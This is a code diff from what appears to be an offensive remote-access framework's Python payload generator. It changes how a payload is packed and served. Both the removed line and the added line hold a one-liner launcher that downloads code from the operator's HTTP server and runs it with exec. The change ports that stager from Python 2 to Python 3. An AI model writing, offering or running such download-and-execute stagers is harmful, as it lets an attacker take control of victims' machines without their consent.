@@ -29,7 +29,7 @@ def getLinuxImportedModules():
 
 def pack_py_payload(target, display, conf, autostart=True):
     display(Success('Generating PY payload ...'))
-
+    target._rustc = True
     stdlib = dependencies.importer(
         target, (
             'pyasn1', 'rsa', 'pyaes',
@@ -69,14 +69,13 @@ def serve_payload(display, server, payload, link_ip=None):
 
     landing_uri = server.serve_content(payload, alias='py payload')
 
-    display(Warn('Python 2.7.x required, x should be >= 9'))
+    display(Warn('Python 3 required'))
 
     if link_ip is None:
         link_ip = server.address
 
     display(List([
-        "python -c 'import urllib;exec urllib.urlopen"
-        "(\"http://%s:%s%s\").read()'" % (
+        "python3 -c 'import urllib.request as r;exec(r.urlopen(\"http://%s:%s%s\").read().decode(\"utf8\"))'" % (
             link_ip, server.web_handler_port, landing_uri
         ),
     ], caption=Success(
